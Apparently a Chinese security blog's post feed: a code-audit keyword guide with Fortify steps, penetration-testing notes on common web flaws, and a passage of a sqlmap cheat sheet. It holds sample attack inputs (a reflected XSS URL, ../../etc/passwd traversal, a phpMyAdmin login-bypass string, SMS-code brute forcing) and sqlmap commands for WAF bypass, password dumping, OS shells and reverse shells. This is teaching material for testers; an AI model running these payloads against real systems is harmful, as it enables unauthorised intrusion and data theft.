<h1 id="🧶人工代码审计的通用思路"><a href="#🧶人工代码审计的通用思路" class="headerlink" title="🧶人工代码审计的通用思路"></a>🧶人工代码审计的通用思路</h1><blockquote>
<p>1、通读全文代码，从功能函数代码开始阅读，例如include文件夹下的common_fun.php，或者有类似关键字的文件。</p>
<p>2、看配置文件，带有config关键字的文件，找到mysql.class.php文件的connect()函数，查看在数据库连接时是否出现漏洞。</p>
<p>3、继续跟读首页文件index.php,了解程序运作时调用了哪些函数和文件以index.php文件作为标线，一层一层去扩展阅读所包含的文件，了解其功能，之后进入其功能文件夹的首页文件，进行扩展阅读。 </p>
</blockquote>
<hr>
<h1 id="🧵漏洞产生的原因"><a href="#🧵漏洞产生的原因" class="headerlink" title="🧵漏洞产生的原因"></a>🧵漏洞产生的原因</h1><blockquote>
<p>1、变量控制不严（一切输入都是有害）。</p>
<p>2、变量到达有利用价值的函数（一切进入函数的变量是有害的），漏洞的利用效果取决于最终函数的功能。</p>
</blockquote>
<hr>
<h1 id="基于关键词审计技巧总结："><a href="#基于关键词审计技巧总结：" class="headerlink" title="基于关键词审计技巧总结："></a>基于关键词审计技巧总结：</h1><p>在搜索时要注意是否为整个单词,以及小写敏感这些设置</p>
<h2 id="php审计"><a href="#php审计" class="headerlink" title="php审计"></a>php审计</h2><h3 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a><strong>命令执行漏洞</strong></h3><blockquote>
<p><strong>system（）、exec（）、shell_exec（）、passthru（）、pcntl_exec（）、popen（）、proc_open（）</strong></p>
</blockquote>
<h3 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h3><blockquote>
<p>eval（）、assert（）、preg_replace（）、call_user_func（）、call_user_func_array（）、array_map（）</p>
</blockquote>
<h3 id="xss：常用的输出函数列表如下："><a href="#xss：常用的输出函数列表如下：" class="headerlink" title="xss：常用的输出函数列表如下："></a><strong>xss：常用的输出函数列表如下：</strong></h3><blockquote>
<p>print、print_r、echo、printf、sprintf、die、var_dump、var_export，</p>
</blockquote>
<h3 id="文件读取函数列表如下："><a href="#文件读取函数列表如下：" class="headerlink" title="文件读取函数列表如下："></a>文件读取函数列表如下：</h3><blockquote>
<p>file_get_contents（）、highlight_file（）、fopen（）、readfile（）、fread（）、fgetss（）、fgets（）、parse_ini_file（）、show_source（）、file（）</p>
</blockquote>
<h3 id="sql注入关键字"><a href="#sql注入关键字" class="headerlink" title="sql注入关键字:"></a>sql注入关键字:</h3><blockquote>
<p>select、insert、update、$_GET、$_POST、$_REQUEST、</p>
</blockquote>
<h3 id="上传漏洞关键字"><a href="#上传漏洞关键字" class="headerlink" title="上传漏洞关键字:"></a><strong>上传漏洞关键字:</strong></h3><blockquote>
<p>$_FILES 、move_uploaded_file</p>
</blockquote>
<h3 id="执行漏洞关键字"><a href="#执行漏洞关键字" class="headerlink" title="执行漏洞关键字:"></a><strong>执行漏洞关键字</strong>:</h3><blockquote>
<p> shell_exec、exec、passthru</p>
<p>system、popen</p>
</blockquote>
<h3 id="包含漏洞关键字"><a href="#包含漏洞关键字" class="headerlink" title="包含漏洞关键字:"></a><strong>包含漏洞关键字:</strong></h3><blockquote>
<p><strong>include、include_once、require、require_once</strong></p>
</blockquote>
<blockquote>
<p><strong>变量覆盖关键字:</strong> $$</p>
</blockquote>
<h3 id="跨站漏洞关键字"><a href="#跨站漏洞关键字" class="headerlink" title="跨站漏洞关键字:"></a><strong>跨站漏洞关键字:</strong></h3><blockquote>
<p>echo、print、print_r、var_dump、var_exprot,insert</p>
</blockquote>
<hr>
<h2 id="java审计"><a href="#java审计" class="headerlink" title="java审计"></a><strong>java审计</strong></h2><p><strong>密码硬编码、密码明文存储：</strong></p>
<blockquote>
<p>password 、pass、jdbc</p>
</blockquote>
<p><strong>XSS：</strong></p>
<blockquote>
<p>getParamter、&lt;%=、param.</p>
</blockquote>
<p><strong>任意文件下载：</strong></p>
<blockquote>
<p><strong>download 、fileName 、filePath、write、getFile、getWriter</strong></p>
</blockquote>
<p><strong>任意文件删除：</strong></p>
<blockquote>
<p><strong>Delete、deleteFile、fileName 、filePath</strong></p>
</blockquote>
<p><strong>文件上传：</strong></p>
<blockquote>
<p>Upload、write、fileName 、filePath</p>
</blockquote>
<p><strong>命令注入：</strong></p>
<blockquote>
<p><strong>getRuntime、exec、cmd、shell</strong></p>
</blockquote>
<p><strong>缓冲区溢出：</strong></p>
<blockquote>
<p><strong>strcpy,strcat,scanf,memcpy,memmove,memeccpy，</strong> Getc(),fgetc(),getchar;read,printf</p>
</blockquote>
<p><strong>XML 注入：</strong></p>
<blockquote>
<p><strong>DocumentBuilder、XMLStreamReader、SAXBuilder、SAXParser</strong></p>
<p> SAXReader 、XMLReader</p>
<p> SAXSource 、TransformerFactory 、SAXTransformerFactory 、</p>
<p> SchemaFactory</p>
</blockquote>
<p><strong>反序列化漏洞：</strong></p>
<blockquote>
<p><strong>ObjectInputStream.readObject</strong></p>
<p> 、ObjectInputStream.readUnshared、XMLDecoder.readObject</p>
<p> Yaml.load 、 XStream.fromXML 、 ObjectMapper.readValue 、</p>
<p> JSON.parseObject</p>
</blockquote>
<p><strong>url 跳转：</strong></p>
<blockquote>
<p><strong>sendRedirect、setHeader、forward</strong></p>
</blockquote>
<p><strong>不安全组件暴露：</strong></p>
<blockquote>
<p><strong>activity 、 Broadcast Receiver 、 Content Provider 、 Service 、</strong></p>
<p> inter-filter</p>
</blockquote>
<p><strong>日志记录敏感信息：</strong></p>
<blockquote>
<p>log log.info logger.info</p>
</blockquote>
<p><strong>代码执行：</strong></p>
<blockquote>
<p><strong>eval、system、exec</strong></p>
</blockquote>
<hr>
<p><strong>工具局限性：</strong></p>
<blockquote>
<p><strong>工具本身存在一定量的误报或者漏报。</strong></p>
<p>扫描结果需要大量人工确定甄别。</p>
<p>如用多种语言开发的软件，则需单独分析。</p>
<p>使用工具缺乏规范化的编码规范。</p>
<p>不能自动收集常见的代码安全问题。   </p>
</blockquote>
<h1 id="fortify使用"><a href="#fortify使用" class="headerlink" title="fortify使用"></a>fortify使用</h1><h2 id="🎃简介"><a href="#🎃简介" class="headerlink" title="🎃简介"></a>🎃简介</h2><blockquote>
<p>Fortify 是一个静态的、白盒的软件源代码安全测试工具。它通过内置的五大主要分析引擎：数据流、语义、结构、控制流、配置流等对应用软件的源代码进行静态的分析，通过与软件安全漏洞规则集进行匹配、查找，从而将源代码中存在的安全漏洞扫描出来，并可导出报告。扫描的结果中包括详细的安全漏洞信息、相关的安全知识、修复意见。</p>
</blockquote>
<h2 id="原🛒理"><a href="#原🛒理" class="headerlink" title="原🛒理"></a>原🛒理</h2><blockquote>
<p>-首先通过调用语言的编译器或者解释器把前端的语言代码（如JAVA，C/C++源代码）转换成一种中间媒体文件NST（Normal Syntax Tree），将其源代码之间的调用关系，执行环境，上下文等分析清楚。</p>
<p>-通过分析不同类型问题的静态分析引擎分析NST文件，同时匹配所有规则库中的漏洞特征，将漏洞抓取出来，然后形成包含详细漏洞信息的FPR结果文件，用AWB打开查看。</p>
</blockquote>
<h2 id="支持语言"><a href="#支持语言" class="headerlink" title="支持语言"></a><strong>支持语言</strong></h2><blockquote>
<p>1.asp.net</p>
<p>2.VB.Net</p>
<p>3.c#.Net</p>
<p>4.ASP</p>
<p>5.VS6</p>
<p>7.java</p>
<p>8.JSP</p>
<p>9.javascript</p>
<p>10.HTML</p>
<p>11.XML</p>
<p>12.C/C++</p>
<p>13.PHP</p>
<p>14.T-SQL</p>
<p>15.PL/SQL</p>
<p>16.Action script</p>
<p>17.Object-C (iphone-2012/5)</p>
<p>18.ColdFusion5.0 - </p>
<p>19.python -</p>
<p>20.COBOL -</p>
<p>21.SAP-ABAP -</p>
</blockquote>
<h2 id="扫描步骤"><a href="#扫描步骤" class="headerlink" title="扫描步骤"></a>扫描步骤</h2><h3 id="配置信息：HP-Fortify-SCA-and-Applications-4-10-WIN10（64位家庭版）"><a href="#配置信息：HP-Fortify-SCA-and-Applications-4-10-WIN10（64位家庭版）" class="headerlink" title="配置信息：HP Fortify SCA and Applications 4.10+WIN10（64位家庭版）"></a>配置信息：HP Fortify SCA and Applications 4.10+WIN10（64位家庭版）</h3><h3 id="步骤1、打开fortify的工作台"><a href="#步骤1、打开fortify的工作台" class="headerlink" title="步骤1、打开fortify的工作台"></a>步骤1、打开fortify的工作台</h3><p><img src="/image/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1.jpg"></p>
<h3 id="步骤2、如果源代码是java，选择Scan-Java，源码是C-选择Scan-VS，不知道的话选择Advanced-Scan"><a href="#步骤2、如果源代码是java，选择Scan-Java，源码是C-选择Scan-VS，不知道的话选择Advanced-Scan" class="headerlink" title="步骤2、如果源代码是java，选择Scan Java，源码是C#选择Scan VS，不知道的话选择Advanced Scan"></a>步骤2、如果源代码是java，选择Scan Java，源码是C#选择Scan VS，不知道的话选择Advanced Scan</h3><p><img src="/image/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/2.jpg"></p>
<h3 id="步骤3、选择代码文件夹（不建议将文件夹拆开，如果文件夹过大，可要求开发人员拆开，按文件夹分开扫描）"><a href="#步骤3、选择代码文件夹（不建议将文件夹拆开，如果文件夹过大，可要求开发人员拆开，按文件夹分开扫描）" class="headerlink" title="步骤3、选择代码文件夹（不建议将文件夹拆开，如果文件夹过大，可要求开发人员拆开，按文件夹分开扫描）"></a>步骤3、选择代码文件夹（不建议将文件夹拆开，如果文件夹过大，可要求开发人员拆开，按文件夹分开扫描）</h3><p><img src="/image/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/3.jpg"></p>
<h3 id="步骤4、确定后，弹出通知框，如下图，选择java版本，点击OK"><a href="#步骤4、确定后，弹出通知框，如下图，选择java版本，点击OK" class="headerlink" title="步骤4、确定后，弹出通知框，如下图，选择java版本，点击OK"></a>步骤4、确定后，弹出通知框，如下图，选择java版本，点击OK</h3><p><img src="/image/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/4.jpg"></p>
<p>根据情况选择后，点击Scan，等待扫描</p>
<p><img src="/image/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/5.jpg"></p>
<p><img src="/image/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/6.jpg"></p>
<h3 id="步骤5、扫描完成后的界面"><a href="#步骤5、扫描完成后的界面" class="headerlink" title="步骤5、扫描完成后的界面"></a>步骤5、扫描完成后的界面</h3><p><img src="/image/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/7.jpg"></p>
<p><img src="/image/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/.jpg"></p>
<p>tips：可通过菜单栏进行界面的组件的配置</p>
<p><img src="/image/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/9.jpg"></p>
<h3 id="步骤6、对结果进行分析，填写分析结论及备注信息"><a href="#步骤6、对结果进行分析，填写分析结论及备注信息" class="headerlink" title="步骤6、对结果进行分析，填写分析结论及备注信息"></a>步骤6、对结果进行分析，填写分析结论及备注信息</h3><p><img src="/image/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/10.jpg"></p>
<h3 id="步骤7、点击菜单栏的reports，选择审计规则，导出即可"><a href="#步骤7、点击菜单栏的reports，选择审计规则，导出即可" class="headerlink" title="步骤7、点击菜单栏的reports，选择审计规则，导出即可"></a>步骤7、点击菜单栏的reports，选择审计规则，导出即可</h3><p><img src="/image/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/11.jpg"></p>
<p>、</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>web常见漏洞</title>
    <url>/2019/11/20/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p><strong>1. 暴力猜解用户名及密码</strong></p>
<p>   第一步肯定是要做这个工作的，不提供测试账号，当然要暴力猜解一下了。尝试一些弱口令如admin:admin, test:test, weblogic:weblogic, root:passwd等等，如以下在渗透测试过程中遇到的口令test:test。</p>
<p><strong>2. 扫敏感目录及备份文件</strong></p>
<p>   扫目录是一门很大的学问，扫目录扫好了，很多大型站点就因敏感目录、备份文件、上传文件及编辑器页面而沦陷。下面举一个渗透实例，下面这个网址一看给人无从下手的感觉，于是扫了一下它的目录，扫出来一个废弃页面，而这个页面恰好存在struts漏洞。</p>
<p><img src="/image/web/1.jpg"></p>
<p>一看是报错的，其实丢到工具里测试一下，Struts</p>
<p><img src="/image/web/2.jpg"></p>
<p>接着扫描发现网站根目还有一个Web.rar文件。</p>
<p><img src="/image/web/3.jpg"></p>
<p>发现门户网站存在敏感文件下载漏洞，测试人员通过下载Web.rar文件可获取MSSQLSSA连接用户名密码,通过测试数据库可远程连接。</p>
<p><strong>3</strong>. PhpMyadmin的万能密码</p>
<p>​    这是某会议值守时遇到一个phpmyadmin的万能密码，极其罕见，有生之年大概不会遇到第二次，这里只是提供一个思路，输入localhost’@‘@”即可绕过phpmyadmin的登录入口。</p>
<p><strong>4. 报错页面的图片也是可以存在反射型XSS的</strong></p>
<p>这个也是碰巧找到的，也是被逼出来的。这个站点实在是过滤得太严格，无聊中在一个图片后面加了点特殊字符，没想到这些字符被返回到页面中去了。然后加上跨站代码，没想到这个png图片页面是先XSS弹窗，然后WAF再提示“信息提示：请不要提交恶意字符”，这个真是无语。</p>
<p><code>http://xxxxxx.com/BICP/framework/images/mainSkin/mainFrm/errorIcon.png”&gt;&lt;/textarea&gt;&lt;script&gt;alert(/TOPSEC/)&lt;%2fscript&gt;alert(/TOPSEC/)    </code></p>
<p><code>alert(/TOPSEC/)</code></p>
<p><img src="/image/web/4.jpg"></p>
<p><strong>5. 隐藏域中可能存着明文密码</strong></p>
<p>举一个某省移动内网的渗透实例（这个确切的说，不算是隐藏域，但是和隐藏域类似。说白了，就是明文密码存在当前页面的源码中，但是你光看页面是看不到的。但是那个具体实例我找不到了，那个密码是隐藏在一个“找回密码处”的页面中）</p>
<p>看到没，它的密码直接保存在源码中，value后面的abc123就是密码了。</p>
<p><img src="/image/web/5.jpg"></p>
<p><strong>6. 逻辑漏洞——任意用户密码重置</strong></p>
<p>各式各样的逻辑漏洞广泛存在，而且很难杜绝，扫描器很难扫描到，而且每个人找逻辑漏洞的思路又不一样。</p>
<p>   密码找回处，仅仅通过手机验证码校验，而且验证码仅仅为4位数字，有效期为15分钟。在15分钟内，完全可以遍历0000置9999所有的验证码组合，所以此漏洞可以重置包括管理员在内的任意用户的密码。</p>
<p><strong>7. 短信炸弹</strong></p>
<p>   “短信炸弹”广泛存在，这个就不用详细说了，有发短信的地方，就试试“短信炸弹”漏洞吧。</p>
<p><strong>8. SVN源码泄露</strong></p>
<p>这个实例也是某省移动的，对于大数量的IP段来说，SVN源码泄露问题防范存在。</p>
<p><a href="https://www.xxx.com/.svn/entries">https://www.xxx.com/.svn/entries</a></p>
<p>在网址后面加/.svn/entries，源码泄露了</p>
<p><strong>9. 扫描一下局域网共享</strong></p>
<p>如果你处在内网环境中，不妨扫一扫局域网的共享文件吧。我在河南就遇到一次，网站的配置文件直接被共享在局域网中了，我也不知道这个管理员为啥要把tomcat目录开个局域网共享。</p>
<p>看看下面这张图，一个站就这样被沦陷了，这个站也是没有测试账号，但是看到这个文件后，也不需要测试账号了。</p>
<p><img src="/image/web/7.jpg"></p>
<p><strong>10. 关注一些非主流的漏洞，如HTTP响应拆分漏洞</strong></p>
<p>以前在OWASP书中看到过这一漏洞，这回遇上了。当然下边的这个漏洞利用起来还是比较困难的，因为SETCOOKIE的-及空格都被过滤掉了。</p>
<p><img src="/image/web/8.jpg"></p>
<p><strong>11. 扫一下端口</strong></p>
<p>  下面这个页面，你看着是不是觉得没有什么希望，不想再搞下去了呢。</p>
<p>  但是nmap扫端口，开放着9091、21端口，浏览器打开发现9091是另一个WEB应用，</p>
<p><a href="http://www.xxx.com/">http://www.xxx.com:80/</a></p>
<p><a href="http://www.xxx.com:9091/">http://www.xxx.com:9091/</a></p>
<p><a href="https://www.xxx.com/">https://www.xxx.com/</a></p>
<p>有可能对应着不同的WEB应用，渗透测试又可以继续了（原来的渗透测试报告没找到，没办法发图</p>
<p><strong>12. 发掘隐藏的链接地址</strong></p>
<p>   上面这个页面，没有测试账号及用户名，看着有点晕晕的，不知道该如何下手，但是很快注意到左下角的两个链接地址，于是手工测试一下。</p>
<p><img src="/image/web/9.jpg"></p>
<p>左边的那个帮助文档没有什么安全问题，但是右边的“相关软件”的链接，存在一个任意文件下载漏洞</p>
<p>treasuryauth/authAction.do?method=download&amp;fileName=../../../../../../etc/passwd</p>
<p><img src="/image/web/10.jpg"></p>
<p><strong>13. 发掘一些越权的测试页面</strong></p>
<p><img src="/image/web/11.jpg"></p>
<p><strong>14. IIS短文件名泄露漏洞</strong></p>
<p>危害：Microsoft</p>
<p>IIS在实现上存在文件枚举漏洞，攻击者可利用此漏洞枚举网络服务器根目录中的文件。危害：攻击者可以利用“~”字符猜解或遍历服务器中的文件名，或对IIS服务器中的.Net</p>
<p>Framework进行拒绝服务攻击。</p>
<p>验证方法说明：在命令行模式运行IIS-shortname工具，执行java</p>
<p>scanner 2 20 <a href="http://www.xxx.com回车执行,看是否能遍历服务器中的文件名./">http://www.xxx.com回车执行，看是否能遍历服务器中的文件名。</a></p>
<p><strong>15. jQuery存在XSS漏洞</strong></p>
<p><strong>危害：</strong>jQuery是一个 JavaScript 库。版本低于1.7的jQuery过滤用户输入数据所使用的正则表达式存在缺陷，可能导致LOCATION.HASH跨站漏洞</p>
<p><strong>验证方法说明：</strong>直接在火狐浏览器打开JQuery漏洞地址，查看源代码里面的JQuery版本是否存在低于1.7，如果低于1.7那么就存在漏洞。</p>
<p><img src="/image/web/12.jpg"></p>
<p><strong>16. 目录浏览漏洞</strong></p>
<p><strong>危害：</strong>由于Web服务器权限配置不当，造成用户可以直接浏览Web网站目录，如图片目录images,javascript目录js,不同的目录潜在的危险是不同的。攻击者一般利用常见目录中可能包含的敏感文件获取敏感信息。</p>
<p><strong>验证方法说明：</strong>直接在火狐浏览器打开目录浏览页面，看是否存在列目录。</p>
<p><strong>17. URL跳转漏洞</strong></p>
<p>经确认，存在Struts 2 URL跳转漏洞，导致网站的恶意跳转。</p>
<p><img src="/image/web/13.jpg"></p>
<p><strong>18. 框架钓鱼漏洞</strong></p>
<p>网站应用程序未对用户输入的危险字符进行有效检验，导致存在可注入frame或iframe标记，从而嵌入可进行诱骗攻击的恶意网站地址。</p>
<p><img src="/image/web/14.jpg"></p>
<p><strong>19 .点击劫持</strong></p>
<p>应用程序没有对用户提交的数据进行有效的过滤或转换，攻击者可向WEB页面里插入对终端用户造成影响或损失的恶意链接。</p>
<p><strong>20. HTTP报头追踪漏洞</strong></p>
<p>目标网站支持TRACE/TRACK WEB服务器HTTP连接方式调节功能。当该调试功能开启时，包含敏感信息的HTTP报头可能被攻击者追踪截获。经检测发现该网站存在HTTP报头协议追踪漏洞。</p>
<p><strong>漏洞危害：</strong></p>
<p>攻击者利用该漏洞，通过构造恶意Script脚本追踪HTTP报头，可能获取HTTP报头中包含的敏感资讯，如 Cookie或认证证书等。</p>
<p><strong>21. DNS域传送漏洞</strong></p>
<p>检测发现目标系统存在配置缺陷，攻击者可通过请求域传送操作，获取网站域内的详细信息。</p>
<p><strong>22.私有IP泄露</strong></p>
<p><strong>检测发现目标网站未对页面信息进行有效安全过滤，通过请求和响应数据包发现内部私有IP敏感信息。</strong></p>
<p><strong>23. 网络物理路径信息泄漏漏洞</strong></p>
<p><strong>24. 系统重装漏洞</strong></p>
<p>易商宝”CMS存在系统重装漏洞，通过此漏洞可重新安装该CMS，并取得网站的管理员权限。为不影响网站的正常运行，未进行漏洞实际验证。</p>
<p><strong>25. 任意文件下载</strong></p>
<p>向以上URL提交任意已知文件名可以下载到文件内容，导致网站敏感文件被下载。</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap使用</title>
    <url>/2020/03/09/sqlmap%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cookie注入：sqlmap.py -u 注入点 --cookie &quot;参数&quot; --tables --level 2</span><br><span class="line"></span><br><span class="line">POST登录框注入：sqlmap.py -r 从文件读取数据 -p 指定的参数 --tables</span><br><span class="line"></span><br><span class="line">sqlmap.py -u 登录的地址 --forms 自动判断注入</span><br><span class="line"></span><br><span class="line">sqlmap.py -u 登录的地址 --data &quot;指定参数&quot;</span><br><span class="line"></span><br><span class="line">绕过waf防火墙：sqlmap.py -u 注入点 -v 3 --dbs --batch --tamper space2morehash.py,space2hash.py,base64encode.py,charencode.py</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-u       #注入点</span><br><span class="line"></span><br><span class="line">-g        谷歌搜索</span><br><span class="line"></span><br><span class="line">-f       #指纹判别数据库类型</span><br><span class="line"></span><br><span class="line">-b        #获取数据库版本信息</span><br><span class="line"></span><br><span class="line">-p        #指定可测试的参数(?page&#x3D;1&amp;id&#x3D;2 -p “page,id”)</span><br><span class="line"></span><br><span class="line">-D“”             #指定数据库名</span><br><span class="line"></span><br><span class="line">-T“”          #指定表名</span><br><span class="line"></span><br><span class="line">-C “”          #指定字段</span><br><span class="line"></span><br><span class="line">-s “”           #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s “xx.log”　　恢复:-s “xx.log” –resume)</span><br><span class="line"></span><br><span class="line">–columns              #列出字段</span><br><span class="line"></span><br><span class="line">–current-user          #获取当前用户名称</span><br><span class="line"></span><br><span class="line">–current-db            #获取当前数据库名称</span><br><span class="line"></span><br><span class="line">–users                        #列数据库所有用户</span><br><span class="line"></span><br><span class="line">–passwords                         #数据库用户所有密码</span><br><span class="line"></span><br><span class="line">–privileges                   #查看用户权限(–privileges -U root)</span><br><span class="line"></span><br><span class="line">-U                          #指定数据库用户</span><br><span class="line"></span><br><span class="line">–dbs                             #列出所有数据库</span><br><span class="line"></span><br><span class="line">–tables -D “”                    #列出指定数据库中的表</span><br><span class="line"></span><br><span class="line">–columns -T “user” -D “mysql”                             #列出mysql数据库中的user表的所有字段</span><br><span class="line"></span><br><span class="line">–dump-all                                          #列出所有数据库所有表</span><br><span class="line"></span><br><span class="line">–exclude-sysdbs                                            #只列出用户自己新建的数据库和表</span><br><span class="line"></span><br><span class="line">–dump -T “” -D “” -C “”                 #列出指定数据库的表的字段的数据(–dump -T users -D master -C surname)</span><br><span class="line"></span><br><span class="line">–dump -T “” -D “” –start 2 –top 4                  # 列出指定数据库的表的2-4字段的数据</span><br><span class="line"></span><br><span class="line">–dbms                       #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB)</span><br><span class="line"></span><br><span class="line">–os                 #指定系统(Linux,Windows)</span><br><span class="line"></span><br><span class="line">--sql -shell                  写shell</span><br><span class="line"></span><br><span class="line">--delay                      延迟的时间</span><br><span class="line"></span><br><span class="line">--safe-freq                         次数</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-v #详细的等级(0-6)</span><br><span class="line"></span><br><span class="line">0：只显示Python的回溯，错误和关键消息。</span><br><span class="line"></span><br><span class="line">1：显示信息和警告消息。</span><br><span class="line"></span><br><span class="line">2：显示调试消息。</span><br><span class="line"></span><br><span class="line">3：有效载荷注入。</span><br><span class="line"></span><br><span class="line">4：显示HTTP请求。</span><br><span class="line"></span><br><span class="line">5：显示HTTP响应头。</span><br><span class="line"></span><br><span class="line">6：显示HTTP响应页面的内容</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">–privileges      #查看权限</span><br><span class="line"></span><br><span class="line">–is-dba           #是否是数据库管理员</span><br><span class="line"></span><br><span class="line">–roles               #枚举数据库用户角色</span><br><span class="line"></span><br><span class="line">–udf-inject            #导入用户自定义函数（获取系统权限）</span><br><span class="line"></span><br><span class="line">–union-check                  #是否支持union 注入</span><br><span class="line"></span><br><span class="line">–union-cols                       #union 查询表记录</span><br><span class="line"></span><br><span class="line">–union-test                         #union 语句测试</span><br><span class="line"></span><br><span class="line">–union-use                      #采用union 注入</span><br><span class="line"></span><br><span class="line">–union-tech orderby                    #union配合order by</span><br><span class="line"></span><br><span class="line">–method “POST” –data “”                    #POST方式提交数据(–method “POST” –data “page&#x3D;1&amp;id&#x3D;2″)</span><br><span class="line"></span><br><span class="line">–cookie “用;号分开”               #cookie注入(–cookies&#x3D;”PHPSESSID&#x3D;mvijocbglq6pi463rlgk1e4v52; security&#x3D;low”)</span><br><span class="line"></span><br><span class="line">–referer “”                #使用referer欺骗(–referer “http:&#x2F;&#x2F;www.baidu.com”)</span><br><span class="line"></span><br><span class="line">–user-agent “”                   #自定义user-agent</span><br><span class="line"></span><br><span class="line">–proxy “http:&#x2F;&#x2F;127.0.0.1:8118″                     #代理注入</span><br><span class="line"></span><br><span class="line">–string “”                        #指定关键词</span><br><span class="line"></span><br><span class="line">–threads 　　 #采用多线程(–threads 3)</span><br><span class="line"></span><br><span class="line">–sql-shell                 #执行指定sql命令</span><br><span class="line"></span><br><span class="line">–sql-query                     #执行指定的sql语句(–sql-query “SELECT password FROM mysql.user WHERE user &#x3D; ‘root’ LIMIT 0, 1″ )</span><br><span class="line"></span><br><span class="line">–file-read                    #读取指定文件</span><br><span class="line"></span><br><span class="line">–file-write                       #写入本地文件(–file-write &#x2F;test&#x2F;test.txt –file-dest &#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt;将本地的test.txt文件写入到目标的1.txt)</span><br><span class="line"></span><br><span class="line">–file-dest                          #要写入的文件绝对路径</span><br><span class="line"></span><br><span class="line">–os-cmd&#x3D;id                       #执行系统命令</span><br><span class="line"></span><br><span class="line">–os-shell               #系统交互shell</span><br><span class="line"></span><br><span class="line">–os-pwn                         #反弹shell(–os-pwn –msf-path&#x3D;&#x2F;opt&#x2F;framework&#x2F;msf3&#x2F;)</span><br><span class="line"></span><br><span class="line">–msf-path&#x3D;                         #matesploit绝对路径(–msf-path&#x3D;&#x2F;opt&#x2F;framework&#x2F;msf3&#x2F;)</span><br><span class="line"></span><br><span class="line">–os-smbrelay #</span><br><span class="line"></span><br><span class="line">–os-bof #</span><br><span class="line"></span><br><span class="line">–reg-read                         #读取win系统注册表</span><br><span class="line"></span><br><span class="line">–priv-esc #</span><br><span class="line"></span><br><span class="line">–time-sec&#x3D;                             #延迟设置 默认–time-sec&#x3D;5 为5秒</span><br><span class="line"></span><br><span class="line">-p “user-agent” –user-agent “sqlmap&#x2F;0.7rc1 (http:&#x2F;&#x2F;sqlmap.sourceforge.net)”            </span><br><span class="line">  #指定user-agent注入</span><br><span class="line"></span><br><span class="line">–eta #盲注</span><br><span class="line"></span><br><span class="line">&#x2F;pentest&#x2F;database&#x2F;sqlmap&#x2F;txt&#x2F;</span><br><span class="line"></span><br><span class="line">common-columns.txt　　字段字典</span><br><span class="line"></span><br><span class="line">common-outputs.txt</span><br><span class="line"></span><br><span class="line">common-tables.txt 表字典</span><br><span class="line"></span><br><span class="line">keywords.txt</span><br><span class="line"></span><br><span class="line">oracle-default-passwords.txt</span><br><span class="line"></span><br><span class="line">user-agents.txt</span><br><span class="line"></span><br><span class="line">wordlist.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1)判断当前用户是否是dba</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --is-dba -v 1</span><br><span class="line"></span><br><span class="line">2)--users:列出数据库管理系统用户</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --users -v 0</span><br><span class="line"></span><br><span class="line">3)--passwords:数据库用户密码(hash)</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --passwords -v 0</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --passwords -U sa -v 0</span><br><span class="line"></span><br><span class="line">4)查看用户权限</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --privileges -v 0</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --privileges -U postgres -v 0</span><br><span class="line"></span><br><span class="line">5)--dbs可以利用的数据库</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --dbs -v 0</span><br><span class="line"></span><br><span class="line">6)--tables列数据库表</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --tables -D &quot;information_scheam&quot;</span><br><span class="line"></span><br><span class="line">-D:指定数据名称</span><br><span class="line"></span><br><span class="line">7)--columns 列出表中的列名</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --columns -T &quot;user&quot; -D &quot;mysql&quot; -v 1</span><br><span class="line"></span><br><span class="line">-T:指定表名，-D:指定库名</span><br><span class="line"></span><br><span class="line">8)--dump列表中指定列的内容</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --dump -T &quot;users&quot; -D &quot;testdb&quot;</span><br><span class="line"></span><br><span class="line">-C:可以指定字段</span><br><span class="line"></span><br><span class="line">指定列的范围为2到4</span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;url&quot; --dump -T &quot;users&quot; -D &quot;testdb&quot; --start 2 --stop 4 -v 0</span><br><span class="line"></span><br><span 